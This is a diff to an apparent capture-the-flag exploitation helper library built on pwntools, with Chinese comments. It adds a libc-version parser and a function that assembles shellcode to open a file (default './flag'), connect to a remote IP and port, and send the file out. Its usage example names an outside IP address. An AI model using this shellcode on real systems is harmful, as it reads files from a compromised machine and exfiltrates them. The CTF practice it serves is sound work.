@@ -31,6 +31,33 @@ getaddr_byte    = lambda p: u64(p.recv(6).ljust(8, b'\x00'))
 # 以字符串的形式满缓冲区发送数字
 send_num = lambda p, num, buffer_size: p.send(bytes(str(num), 'utf-8').ljust(buffer_size, b'\x00'))
 
+# 发送flag的shellcode
+def sendflag_asm(ip, port = 9999, filename = './flag', file_fd = 3, socket_fd = 4, network = 'ipv4'):
+	'''
+		编写socket客户端的shellcode，发送flag
+  
+  		eg:
+			p.send(asm(sendflag_asm('39.99.32.130')))
+	'''	
+	payload = ''
+	payload += shellcraft.open(filename)
+	payload += shellcraft.connect(ip, port, network)
+	payload += shellcraft.sendfile(socket_fd, file_fd, 0, 0x100)
+	return payload
+
+def get_libc_version(libc):
+    '''
+        获取libc的版本号
+        
+        libc: pwnlib.elf.ELF对象
+        
+        返回值: 版本号整数，例如: 235表示2.35
+    '''
+    strings = libc.read(next(libc.search('GNU C Library ')), 0x100).split(b'\n', 1)[0]
+    version_offset = strings.find(b'version')
+    version = int(strings[version_offset+8:version_offset+12].replace(b'.', b''))
+    return version
+
 # 获取基地址
 class AddrInfo:
     base = 0
